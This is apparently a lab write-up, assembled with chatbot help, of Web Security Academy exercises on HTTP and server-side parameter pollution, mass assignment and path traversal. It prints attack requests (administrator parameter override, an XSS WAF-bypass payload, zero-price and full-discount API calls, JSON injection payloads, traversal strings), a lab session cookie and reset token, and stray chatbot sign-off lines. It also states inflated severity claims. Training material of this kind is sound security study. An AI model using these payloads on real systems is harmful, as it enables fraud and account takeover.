The application is vulnerable to **Mass Assignment** and **Server-Side Parameter Pollution (SSPP)**, allowing unauthorized manipulation of critical API parameters such as product pricing and admin password reset tokens. Improper backend validation and lack of whitelisting enable attackers to escalate privileges or alter sensitive data via JSON structure injection.

Got it. Here is the text and table rendered normally so you can read it straight from the chat interface!

## 🔀 HTTP Parameter Pollution (HPP)
*Requirement: The application processes multiple parameters with the same name unpredictably, allowing you to override values or bypass filters.*

### 1. The Core URL Characters
To manipulate parameters, you must control the delimiters:
* **`&` (Ampersand):** Separates different parameters.
* **`=` (Equals):** Assigns the value.
* **`#` (Hash) / `%23`:** Truncates the URL or acts as a comment fragment.

### 2. The Backend Behavior Matrix
If you send two parameters with the exact same name:
`GET /users/search?name=peter&name=carlos&publicProfile=true`

How different servers parse the `name` parameter:

| Backend Technology | Which parameter does it read? | Output Result |
| :--- | :--- | :--- |
| **PHP** | **Last** parameter only | `carlos` |
| **Node.js / Express** | **First** parameter only | `peter` |
| **ASP.NET** | **Combines** both with a comma | `peter,carlos` |

### 3. The Pro Play (How to Exploit)

**Attack Path A: Privilege Escalation (Overriding Context)**
If an application automatically appends your username to a backend request, you can add a second parameter to override it.

* **The Injection:**
```http
POST /update_profile?username=hacker&username=administrator
```

> *Result:* If the backend is PHP, it ignores `hacker`, reads the last parameter, and updates the `administrator` account instead!

**Attack Path B: WAF Bypass**
If a Web Application Firewall (WAF) only inspects the *first* parameter, but the backend database processes the *last* parameter (like PHP):

* **The Injection:**
```http
GET /search?q=safe_word&q=<script>alert(1)</script>
```

> *Result:* The WAF checks `q=safe_word`, sees it is harmless, and lets it through. The backend ignores the safe word, reads `q=<script>...`, and executes the payload.

**Attack Path C: Truncating Backend Queries**
If you suspect the backend is appending unwanted strings to your input (e.g., `&action=view`), you can use URL-encoded characters to break it.

* **The Injection:**
```http
GET /profile?user=administrator%23
```
> *Result:* The `%23` (`#`) acts as a comment, telling the backend to ignore everything that comes after your payload.

If you are using Burp Suite for the exam, remember James Kettle's **Param Miner** BApp! If you right-click a request, you can select `Guess GET parameters` or `Guess headers`, and it will automatically test for parameter pollution in the background while you keep working.

---


# Proof-of-Concept

## (first find /api endpoint then try OPTION see allow what PATCH,GET,POST,PUT,HEAD?)
or change get post patch delete /api/users/carlos
Attacker can determine allowed HTTP methods via `OPTIONS`.

```
PATCH /api/products/1/price HTTP/2
Host: 0ab9003904b7e3498368507800350075.web-security-academy.net
Cookie: session=BwRdpnXkT5PsrTPSLaGRgyX1GtnAmAah
Content-Type: application/json
Content-Length: 15

{"price":0}
```

– Server returned **500 Internal Server Error**, then a missing parameter hint → set `"price":0` successfully.

## (second saw it show error msg only accept this content-type we add it (rmb no space))

Used correct `Content-Type: application/json` to execute price override.

## (last it show server internal error 500 we inject {} below and skip a line with all header content it show error msg price parameter missing we set price to 0 done)

## MASS ASSIGMENT VULNERABILITY

Developers did not **whitelist fields**, enabling unauthorized JSON override.

```
POST /api/checkout HTTP/2
Content-Type: text/plain;charset=UTF-8

{"chosen_discount":{"percentage":100},
"chosen_products":[{"product_id":"1","quantity":1}]}
```

Changing method to **GET revealed internal JSON structure**, attacker reused on **POST** → 100% discount applied.

---

# Server Side Parameter Pollution

## (website embeds user input in a server-side request to an internal API without adequate encoding. This means that an attacker may be able to manipulate or inject parameters)

### 1. Proxy inspection discovered JS file

<img width="691" height="843" alt="image" src="https://github.com/user-attachments/assets/dd6fe8da-7be0-4347-8b4d-4ca97d3e6ba8" />

Exposed reset function:

```
/forgot-password?reset_token=${resetToken}
```

### 2. At /forgot-password
1. #, &, and =
2. 2 parameter tgt

GET /users/search?name=peter&name=carlos&publicProfile=true

    PHP parses the last parameter only. This would result in a user search for carlos.
    ASP.NET combines both parameters. This would result in a user search for peter,carlos, which might result in an Invalid username error message.
    Node.js / express parses the first parameter only. This would result in a user search for peter, giving an unchanged result.

If you're able to override the original parameter, you may be able to conduct an exploit. For example, you could add name=administrator to the request. This may enable you to log in as the administrator user. 

<img width="408" height="298" alt="image" src="https://github.com/user-attachments/assets/633ba1f3-f4da-4abc-bad5-9d618f0fa65b" />

Tried:

```
csrf=FrwKpTox9SWCJRaG9ZgCVG7iJ7Tg7NGv&username=administrator#
```

→ Revealed parameter **field=**

### 2. OR bruteforce using wordlist

<img width="395" height="284" alt="image" src="https://github.com/user-attachments/assets/4c8a51a5-1d4f-4469-9f65-60623612e28a" />

Used:

```
https://github.com/antichown/burp-payloads/blob/master/Server-side%20variable%20names.pay
```

<img width="395" height="305" alt="image" src="https://github.com/user-attachments/assets/ecebd7ac-4fbf-4363-9892-5283fd02ce36" />

Bruteforced correct *field* parameter (password reset)

### 3. Final exploitation

<img width="469" height="311" alt="image" src="https://github.com/user-attachments/assets/00f49e7e-4f9f-44e1-b06a-61551dab1756" />

Used token:

```
reset_token=3bwxifrxs6peto5p1cy3npoin5cgdleg
```

<img width="315" height="34" alt="image" src="https://github.com/user-attachments/assets/154726e9-e8c9-4bc4-b189-0b836381e6d7" />

**GET** request → gained access

<img width="307" height="39" alt="image" src="https://github.com/user-attachments/assets/da1941a7-82cf-4f21-bcfa-e56472a83a38" />

<img width="734" height="670" alt="image" src="https://github.com/user-attachments/assets/a3a519f4-48f6-4430-b071-1f05b015a1a4" />

**Administrator password reset → done**

---

# Path Traversal Notes

```
../
..;/
..%2f
..%252f
```

Example:

```
GET /profile?user=carlos%2f..%2fadministrator
```

→ Internally becomes:

```
/api/users/administrator
```

---

# (SSPP in Structured Data - Core Takeaways)

## (The Vulnerability)

User input injected into backend JSON without sanitization → embedded directly into internal requests.

## (Two Main Attack Scenarios)

### (1. Form-to-JSON Injection)

```http
POST /update
name=peter","role":"admin
→ {"name":"peter","role":"admin"}
```

### (2. JSON-to-JSON Escape Injection)

```http
POST /update
{"name": "peter\",\"role\":\"admin"}
```

## (Key Testing Payloads)

```http
test","admin":true
test\",\"admin\":true
test","balance":999999
test\",\"balance\":999999
test","role":"admin
```

---

# Screenshots

(Already embedded above inline with notes)

---

# Remediation

* **Strictly whitelist fields** in API input handlers
* Use **strong JSON schema validation**
* Reject unknown / additional parameters using:

  * Node.js: `express-validator`, `joi`
  * Python: `pydantic`
* **Never concatenate JSON strings**
* Enforce:

```json
{
  "type": "object",
  "additionalProperties": false
}
```

* Rotate and invalidate **password reset tokens**
* Apply **WAF filtering for traversal & SSPP markers**
* Log unusual HTTP methods (e.g., PATCH on pricing endpoints)

---

# Final Notes

Mass Assignment & SSPP combined allow:

* Free pricing
* Admin takeover
* Arbitrary JSON manipulation

**Impact: Critical (RCE-level in some cases)**
**Severity: 9.8 (CVSSv3 – Privilege Escalation & Data Tampering)**

---

Let me know if you want:

* CVSS table
* Burp Suite repeater template
* Markdown badge styling for severity
* Full exploit script (Python/Postman)

🔥 Ready for submission.
